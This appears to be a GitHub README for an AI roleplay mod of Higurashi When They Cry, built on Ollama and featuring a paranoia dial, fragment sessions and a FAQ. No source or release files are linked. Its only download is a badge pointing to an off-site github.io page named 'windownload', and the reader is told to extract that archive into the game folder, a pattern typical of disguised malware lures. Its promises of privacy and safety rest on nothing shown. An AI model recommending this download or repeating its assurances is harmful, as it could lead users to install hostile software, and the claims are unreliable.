## About

**Higurashi — AI Edition** puts you back in Hinamizawa in June 1983, with the cicadas going and the festival coming, and lets you actually talk to everyone before it all goes wrong again.

A locally-hosted model plays Rena, Mion, Satoko, Rika and Keiichi. The mod's central feature is the fragment system: each session is a separate world, and paranoia is a dial you can turn.

> 🐦 Turn the suspicion dial up and every friendly answer starts to sound like a cover story. Turn it down and Hinamizawa is the warmest place in the world. Both are canon.

## ✨ Features

- 🌀 **Fragment sessions** — Each conversation is its own world; nothing carries over unless you allow it.
- 😨 **Paranoia dial** — Scales how much the cast withholds, deflects and unsettles.
- 🎏 **Watanagashi timeline** — The festival date advances and the cast's behaviour shifts as it nears.
- 👁️ **Rika's awareness** — An optional mode where Rika alone remembers previous fragments.
- 🔒 **Offline and private** — Everything you're told stays on your machine.
- 🎭 **Sprite-synced dread** — Expression selection includes the game's infamous alternate faces.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Higurashi When They Cry

1. Start from a clean, working installation of **Higurashi When They Cry**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## 🎯 Surviving a fragment

1. Start a fresh fragment when a conversation curdles. That's the intended loop.
2. Rika's awareness mode is the closest thing to a metanarrative here — save it for later.
3. Higher paranoia settings need a capable model; small ones just become incoherent rather than sinister.

## ❓ FAQ

**Q: Does it spoil the answer arcs?**
> The default personas stay within the question arcs. Full knowledge is opt-in via a config flag.

**Q: Which release does it target?**
> The Steam / MangaGamer PC releases, including the console-sprite patch layouts.

**Q: Can I play as Keiichi?**
> Yes, and the mod's paranoia dial is written primarily from his perspective.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
